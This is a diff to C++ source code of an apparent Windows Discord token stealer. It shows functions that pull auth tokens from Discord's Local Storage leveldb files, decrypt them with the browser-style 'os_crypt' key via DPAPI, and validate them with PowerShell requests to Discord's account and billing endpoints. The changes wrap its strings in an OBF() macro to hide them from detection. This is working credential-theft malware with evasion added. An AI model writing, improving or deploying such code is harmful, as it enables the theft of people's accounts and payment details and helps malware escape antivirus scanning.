@@ -10,7 +10,6 @@
 #include <Wincrypt.h>
 #include <winternl.h>
 
-#include "config.h"
 #include "utils.h"
 
 #include "discord.h"
@@ -35,7 +34,7 @@ Discord::Discord(vs svPaths) noexcept
 
 		for (auto token : tokens)
 		{
-			std::string decrypted = this->DecryptToken(token, key);
+			std::string decrypted = this->DecryptToken(token, this->GetKey(path));
 
 			if (decrypted.empty())
 				continue;
@@ -54,7 +53,6 @@ Discord::Discord(vs svPaths) noexcept
 			if (validated.empty())
 				continue;
 
-
 			this->data.append("Token: " + decrypted + "\n" + validated + "\n");
 		}
 	}
@@ -62,12 +60,12 @@ Discord::Discord(vs svPaths) noexcept
 
 vs Discord::GetTokens(std::string path) noexcept
 {
-	std::regex r(R"reg(dQw4w9WgXcQ:[^\"]*)reg");
-	std::regex r2(R"reg([\w-]{24}\.[\w-]{6}\.[\w-]{25,110})reg");
-	std::regex r3(R"reg(ken[^"]{0,32}"([A-z0-9._-]{30,150})")reg");
+	std::regex r(OBF("dQw4w9WgXcQ:[^\\\"]*"));
+	std::regex r2(OBF("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}"));
+	std::regex r3(OBF("ken[^\"]{0,32}\"([A-z0-9._-]{30,150})\""));
 	std::smatch m;
 
-	path += "Local Storage\\leveldb\\";
+	path += OBF("Local Storage\\leveldb\\");
 
 	vs retVal;
 	
@@ -80,7 +78,7 @@ vs Discord::GetTokens(std::string path) noexcept
 			std::string filename = x.path().string();
 
 			//only check log and ldb files
-			if (std::string t(filename.begin() + filename.size() - 4, filename.end()); t != ".log" && t != ".ldb")
+			if (std::string t(filename.begin() + filename.size() - 4, filename.end()); t != OBF(".log") && t != OBF(".ldb"))
 				continue;
 
 			std::ifstream file(x.path().string(), std::ios::binary);
@@ -120,7 +118,7 @@ vs Discord::GetTokens(std::string path) noexcept
 
 DATA_BLOB Discord::GetKey(std::string path) noexcept
 {
-	path += "\\Local State";
+	path += OBF("\\Local State");
 	std::ifstream file(path, std::ios::binary);
 	DATA_BLOB DataVerify = { 0 };
 
@@ -133,7 +131,7 @@ DATA_BLOB Discord::GetKey(std::string path) noexcept
 		std::vector<char> fd(size);
 		file.read(fd.data(), size);
 
-		auto jsonData = (std::string)json::parse(std::string(fd.begin(), fd.end()))["os_crypt"]["encrypted_key"];
+		auto jsonData = (std::string)json::parse(std::string(fd.begin(), fd.end()))[(OBF("os_crypt"))][(OBF("encrypted_key"))];
 
 		auto decoded = utils::base64_decode(jsonData);
 
@@ -168,6 +166,7 @@ std::string Discord::DecryptToken(std::string token, DATA_BLOB key) noexcept
 	if (token.empty()) //Empty
 		return { 0 };
 
+	//Can't obfuscate this string for some reason? Has to do with DATA_BLOB not being constant I think
 	if (token.substr(0, 12) != "dQw4w9WgXcQ:") //Check for unencrypted tokens
 		return token;
 
@@ -273,13 +272,13 @@ EXIT:
 
 std::string Discord::ValidateToken(std::string token) noexcept
 {
-	std::string script = "powershell -ExecutionPolicy Bypass \"try{$Res=iwr -Uri 'https://discord.com/api/v9/users/@me' -Method 'GET' -Headers @{'User-Agent'='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36'; 'Accept'='*/*'; 'Authorization'='";
+	std::string script = OBF("powershell -ExecutionPolicy Bypass \"try{$Res=iwr -Uri 'https://discord.com/api/v9/users/@me' -Method 'GET' -Headers @{'User-Agent'='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36'; 'Accept'='*/*'; 'Authorization'='");
 	script.append(token);
-	script.append("'}; if($?){ echo $Res.Content;}}catch{}\"");
+	script.append(OBF("'}; if($?){ echo $Res.Content;}}catch{}\""));
 
-	std::string script2 = "powershell -ExecutionPolicy Bypass \"try{$Res=iwr -Uri 'https://discord.com/api/v6/users/@me/billing/payment-sources' -Method 'GET' -Headers @{'User-Agent'='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36'; 'Accept'='*/*'; 'Authorization'='";
+	std::string script2 = OBF("powershell -ExecutionPolicy Bypass \"try{$Res=iwr -Uri 'https://discord.com/api/v6/users/@me/billing/payment-sources' -Method 'GET' -Headers @{'User-Agent'='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36'; 'Accept'='*/*'; 'Authorization'='");
 	script2.append(token);
-	script2.append("'}; if($?){ echo $Res.Content;}}catch{}\"");
+	script2.append(OBF("'}; if($?){ echo $Res.Content;}}catch{}\""));
 
 
 	if (!utils::RunSubWorker(NULL, script.c_str()))
